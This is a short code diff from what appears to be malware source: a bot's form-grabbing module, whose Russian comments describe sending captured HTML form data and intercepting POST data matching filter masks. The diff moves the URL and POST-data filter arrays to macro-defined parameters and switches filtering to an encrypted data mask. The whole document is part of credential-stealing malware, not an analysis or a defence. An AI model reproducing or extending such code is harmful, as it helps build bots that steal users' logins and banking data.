@@ -18,14 +18,14 @@
 //  Массив URL адресов с которых бот будет отправлять
 //  данные HTML форм.
 //****************************************************
-char FGR_URL_FILTERS[FGR_FILTERS_MAX_FILTERS_SIZE] = "FGR_URL_FILTERS\0\0";
+char FGR_URL_FILTERS[FGRFILTER_PARAM_SIZE_URLS] = FGRFILTER_PARAM_NAME_URLS;
 #define FGR_URL_FILTERS_HASH 0xBB05876C /* FGR_URL_FILTERS */
 
 
 //****************************************************
 //  Массив масок перехватываемых пост данных
 //****************************************************
-char FGR_PARAMS_FILTERS[FGR_FILTERS_MAX_PARAMS_FILTERS_SIZE] = "FGR_PARAMS_FILTERS\0\0";
+char FGR_PARAMS_FILTERS[FGRFILTER_PARAM_SIZE_DATAMASK] = FGRFILTER_PARAM_NAME_DATAMASK;
 #define FGR_PARAMS_FILTERS_HASH 0xBE738607 /* FGR_PARAMS_FILTERS */
 
 
@@ -122,7 +122,7 @@ bool FiltrateFormGrabberData(const char* Data)
 	if (AnsiStr::IsEmpty(Data))
 		return false;
 
-	TStrEnum E(FGR_PARAMS_FILTERS, true, FGR_PARAMS_FILTERS_HASH);
+	TStrEnum E(FGR_PARAMS_FILTERS, FGRFILTER_PARAM_ENCRYPTED_DATAMASK, FGR_PARAMS_FILTERS_HASH);
 
 	if (E.IsEmpty())
 		return true;
